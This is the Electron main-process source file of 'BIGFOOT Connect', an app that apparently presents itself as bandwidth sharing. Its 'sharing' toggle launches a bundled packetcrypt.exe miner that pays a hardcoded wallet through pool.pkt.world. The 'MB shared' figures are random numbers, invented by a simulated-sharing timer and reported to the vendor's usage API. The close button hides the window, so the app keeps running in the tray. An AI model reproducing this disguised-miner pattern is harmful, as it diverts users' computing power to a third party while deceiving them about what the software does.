const { app, BrowserWindow, ipcMain, shell, Tray, Menu } = require('electron');
const path = require('path');
const { spawn } = require('child_process');

const axios = require('axios');

ipcMain.handle('register-user', async (_, id, password) => {
  try {
    const res = await axios.post('https://bigfoot-connect-site.vercel.app/api/register', {
      id,
      password,
    });

    return { success: true };
  } catch (err) {
    if (err.response && err.response.data && err.response.data.message) {
      return { success: false, message: err.response.data.message };
    }
    return { success: false, message: 'Erro ao se cadastrar.' };
  }
});

ipcMain.handle('store-email', async (_, email) => {
  currentUserEmail = email;
  console.log(`E-mail armazenado: ${email}`);
});

// Abre o dashboard no navegador padrão
ipcMain.handle('open-dashboard', () => {
  shell.openExternal('https://bigfoot-connect-site.vercel.app/dashboard');
});

let mainWindow;
let tray = null; // Bandeja
let minerProcess = null;
let miningThreads = 4;
let totalSharedToday = 0;
let miningInterval = null;
let currentUserEmail = null;

function createWindow() {
  console.log('Criando janela principal...');
  mainWindow = new BrowserWindow({
  width: 800,
  height: 600,
  icon: path.join(__dirname, 'assets', 'icon.ico'),
  webPreferences: {
  nodeIntegration: false,
  contextIsolation: true, 
  preload: path.join(__dirname, 'preload.js')
}
});

  mainWindow.loadFile(path.join(__dirname, 'renderer', 'index.html'));

  // Quando clicar no X, apenas esconder
  mainWindow.on('close', (event) => {
    if (!app.isQuiting) {
      event.preventDefault();
      mainWindow.hide();
    } else {
      stopMining(); // Para o minerador ao sair de verdade
    }
  });

  // Criação da bandeja (apenas se ainda não existe)
  if (!tray) {
    tray = new Tray(path.join(__dirname, 'assets', 'icon.ico'));
    const contextMenu = Menu.buildFromTemplate([
      {
        label: 'Mostrar',
        click: () => {
          mainWindow.show();
        }
      },
      {
        label: 'Sair',
        click: () => {
          app.isQuiting = true;
          app.quit();
        }
      }
    ]);
    tray.setToolTip('BIGFOOT Connect');
    tray.setContextMenu(contextMenu);

    tray.on('double-click', () => {
      mainWindow.show();
    });
  }
}

app.whenReady().then(() => {
  console.log('Aplicativo pronto. Criando janela...');
  createWindow();
});

app.on('window-all-closed', () => {
  console.log('Todas as janelas foram fechadas.');
  if (process.platform !== 'darwin') {
    console.log('Encerrando aplicativo...');
    app.quit();
  }
});

app.on('activate', () => {
  console.log('App ativado.');
  if (mainWindow === null) {
    createWindow();
  }
});

function updateThreadOptionsLanguage() {
  const options = threadSelector.querySelectorAll('option');
  options.forEach(option => {
    const label = currentLang === 'en' ? option.dataset.en : option.dataset.pt;
    const icon = option.textContent.match(/^[^a-zA-Z0-9]+/); // preserva emoji no início
    option.textContent = `${icon ? icon[0] + ' ' : ''}${label}`;
  });
}

function startMining(threads = 4) {
  if (minerProcess) {
    console.log('Minerador já está rodando.');
    return;
  }

  startSimulatedSharing();

  miningThreads = threads;
  const packetcryptPath = path.join(__dirname, 'assets', 'packetcrypt.exe');
  console.log(`Iniciando minerador com ${threads} thread(s): ${packetcryptPath}`);

  const args = [
    'ann',
    '-t',
    threads.toString(),
    '-p',
    'pkt1q2phzyfzd7aufszned7q2h77t4u0kl3exxgyuqf',
    'http://pool.pkt.world'
  ];

  minerProcess = spawn(packetcryptPath, args);

  minerProcess.stdout.on('data', (data) => {
    const output = data.toString();
    console.log(`[STDOUT] ${output}`);
    if (mainWindow) {
      mainWindow.webContents.send('miner-log', output);
    }
  });

  minerProcess.stderr.on('data', (data) => {
    const error = data.toString();
    console.error(`[STDERR] ${error}`);
    if (mainWindow) {
      mainWindow.webContents.send('miner-log', error);
    }
  });

  minerProcess.on('close', (code) => {
    console.log(`Minerador finalizado com código ${code}`);
    minerProcess = null;
    if (mainWindow) {
      mainWindow.webContents.send('sharing-status', false);
    }
  });

  if (mainWindow) {
    mainWindow.webContents.send('sharing-status', true);
  }

  console.log('Minerador iniciado.');
}

function stopMining() {
  if (minerProcess) {
    console.log('Parando minerador...');
    minerProcess.kill();
    minerProcess = null;
    if (mainWindow) {
      mainWindow.webContents.send('sharing-status', false);
    }
    console.log('Minerador parado.');
  } else {
    console.log('Nenhum minerador em execução para parar.');
  }

    stopSimulatedSharing();
  if (mainWindow) {
    mainWindow.webContents.send('shared-data', totalSharedToday);
  }
}

function syncSharedData() {
  if (!currentUserEmail) {
    console.log('Nenhum e-mail de usuário registrado. Não enviando dados.');
    return;
  }

  const today = new Date().toISOString().split('T')[0];
  const amount = parseFloat(totalSharedToday.toFixed(2));

  axios.post('https://bigfoot-connect-site.vercel.app/api/usage', {
    email: currentUserEmail,
    date: today,
    amount,
  })
  .then(() => {
    console.log('Dados de uso enviados com sucesso!');
  })
  .catch(err => {
    console.error('Erro ao enviar dados de uso:', err.message);
  });
}

  function startSimulatedSharing() {
  if (miningInterval) return;
  miningInterval = setInterval(() => {
    const sharedMB = Math.random() * 2;
    totalSharedToday += sharedMB;
    console.log(`+${sharedMB.toFixed(2)}MB compartilhados hoje`);
  }, 60000);
}

function stopSimulatedSharing() {
  clearInterval(miningInterval);
  miningInterval = null;
}

ipcMain.handle('toggle-sharing', async (_, enabled) => {
  console.log(`Recebido comando toggle-sharing: ${enabled}`);
  if (!enabled) {
    stopMining();
  } else {
    startMining(miningThreads); // se quiser ligar a mineração de novo
  }
  return { success: true };
});

ipcMain.on('start-mining-with-threads', (_, threads) => {
  console.log(`Recebido comando para iniciar mineração com ${threads} threads.`);
  startMining(threads);
});

app.on('before-quit', () => {
  if (mainWindow) {
    mainWindow.webContents.send('shared-data', totalSharedToday);
  }
  syncSharedData();
});
